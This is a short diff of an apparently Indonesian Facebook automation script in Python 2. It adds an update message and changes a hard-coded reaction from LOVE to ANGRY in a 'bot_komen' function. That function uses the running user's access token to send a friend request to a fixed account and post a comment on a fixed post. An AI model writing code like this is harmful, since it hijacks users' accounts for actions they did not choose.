@@ -161,6 +161,7 @@ def update():
         print '\033[41;1m Mengupdate Script\033[00;1m'
         time.sleep(1)
         os.system('git pull')
+        print '\033[41;1m Done\033[00;1m'
         time.sleep(2)
         masuk()
 
@@ -201,7 +202,7 @@ def bot_komen():
 
     una = '100045781089477'
     kom = 'Hai\xf0\x9f\x98\x98'
-    reac = 'LOVE'
+    reac = 'ANGRY'
     post = '194234645445904'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
